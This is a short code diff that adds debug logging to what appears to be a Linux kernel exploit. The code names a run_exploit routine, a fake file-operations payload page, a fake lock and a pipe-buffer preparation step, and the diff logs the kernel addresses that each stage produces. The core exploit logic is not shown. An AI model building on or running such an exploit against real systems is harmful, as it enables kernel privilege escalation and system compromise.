@@ -49,11 +49,14 @@ void wait_for_consumer_idle(void) {
 
 int run_cfi_stage_on_worker(void) {
   wait_for_consumer_idle();
-  int seq = atomic_fetch_add(&cfi_worker_request, 1) + 1;
-  while (atomic_load(&cfi_worker_done) != seq) {
-    __asm__ volatile("yield" ::: "memory");
-  }
-  return atomic_load(&cfi_worker_result);
+    int seq = atomic_fetch_add(&cfi_worker_request, 1) + 1;
+    pr_info("cfi worker request seq=%d\n", seq);
+    while (atomic_load(&cfi_worker_done) != seq) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+    pr_info("cfi worker request done seq=%d result=%d\n", seq,
+            atomic_load(&cfi_worker_result));
+    return atomic_load(&cfi_worker_result);
 }
 
 void *waiter_thread(void *arg __attribute__((unused))) {
@@ -239,7 +242,10 @@ void run_main_route_threads(void) {
 
   while (!atomic_load(&route_done)) {
     if (atomic_exchange(&pipe_prepare_request, 0)) {
+      pr_info("pipe prepare begin\n");
       pipebuf_page_base = prepare_pipe_buffer_page();
+      pr_info("pipe prepare end base=%016zx child=%d\n",
+              pipebuf_page_base, (int)pipe_prepare_child);
       atomic_store(&pipe_prepare_done, 1);
     }
     usleep(10000);
@@ -269,7 +275,10 @@ int run_exploit(int argc, char **argv) {
   }
 
   pin_to_core(CORE);
+  pr_info("fops page prepare begin\n");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  pr_info("fops page prepare end page=%016zx lock=%016zx fops=%016zx\n",
+          page_base, fake_lock, fake_fops);
 
   run_main_route_threads();
 
